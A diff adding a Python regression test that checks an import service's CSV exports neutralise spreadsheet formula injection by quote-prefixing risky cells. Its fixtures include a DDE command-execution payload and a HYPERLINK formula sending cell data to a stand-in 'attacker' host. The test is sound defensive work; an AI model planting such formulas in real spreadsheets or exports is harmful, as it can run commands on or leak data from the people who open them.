@@ -1392,6 +1392,46 @@ class ImportServiceTests(unittest.TestCase):
                          {"out@example.org": "no_access", "nosuch@example.org": "unknown_user",
                           "dead@example.org": "inactive", "viewer@example.org": "ok"})
 
+    def test_csv_downloads_neutralise_formula_prefixed_titles(self):
+        # Regression review SECURITY-2 (2026-09-22): a Manager's task title =cmd|' /C calc'!A0
+        # was written verbatim into the two Owner-facing CSV downloads the feature asks the
+        # Owner to open in Excel right after the import (spreadsheet formula injection).
+        import csv as csv_module
+        import io as io_module
+
+        def cells(text):
+            return list(csv_module.reader(io_module.StringIO(text)))
+
+        config = self.service._import_config()
+        labels = list(config.labels())
+        hostile = {"import_key": "INJ-001", "title": "=cmd|' /C calc'!A0", "notes": "+SUM(A1:A9)", "next_action": "-1+1",
+                   "description": "@evil", "start_date": date(2026, 10, 1), "due_date": "2026-10-05"}
+        parsed = cells(importer.build_template_csv(config, tasks=[hostile, {"import_key": "OK-001", "title": "Plain title"}]))
+        keys = [column.key for column in config.active]
+        row = dict(zip(keys, parsed[1]))
+        self.assertEqual(row["title"], "'=cmd|' /C calc'!A0")
+        self.assertEqual(row["notes"], "'+SUM(A1:A9)")
+        self.assertEqual(row["next_action"], "'-1+1")
+        self.assertEqual(row["description"], "'@evil")
+        self.assertEqual((row["start_date"], row["due_date"]), ("01-10-2026", "2026-10-05"))  # digits first: untouched (a date object is displayed, a string kept)
+        self.assertEqual(dict(zip(keys, parsed[2]))["title"], "Plain title")
+        # a leading tab or CR cannot survive normalize_text's strip, so those two prefixes never reach a cell
+        for value, expected in (("\tTab", "Tab"), ("\rCR", "CR"), ("", ""), (None, ""), (12, "12"), ("x=1", "x=1"),
+                                ("  =lead", "'=lead"), ("-", "'-"), ("@", "'@")):
+            self.assertEqual(importer.csv_cell(value), expected, repr(value))
+        # end to end: a Manager imports the title, the Owner downloads the report and the pre-filled template
+        title = '=HYPERLINK("http://attacker/"&A1,"open")'
+        result = self.commit(self.jamal, [{"import_key": "INJ-002", "title": title}])
+        self.assertEqual(self.task_by_key("INJ-002")["title"], title)   # stored as typed; only the CSV cell is guarded
+        report = cells(self.service.import_report(self.owner, result["import_id"])["csv"])
+        report_row = dict(zip(importer.REPORT_COLUMNS, report[1]))
+        self.assertEqual(report_row["title"], "'" + title)
+        payload, _, _ = self.service.import_template(self.owner, "csv", self.project["id"])
+        self.assertEqual(cells(payload.decode("utf-8-sig"))[0], labels)
+        template_rows = [dict(zip(keys, r)) for r in cells(payload.decode("utf-8-sig"))[1:]]
+        self.assertEqual([r["title"] for r in template_rows if r["import_key"] == "INJ-002"], ["'" + title])
+        self.assertEqual([c[0] for c in report if c and c[0].startswith("'")], [])   # only text columns are prefixed
+
 
 class PredecessorSyntaxTests(unittest.TestCase):
     """parse_predecessor is a hand-written linear split (regression review SECURITY-1); these
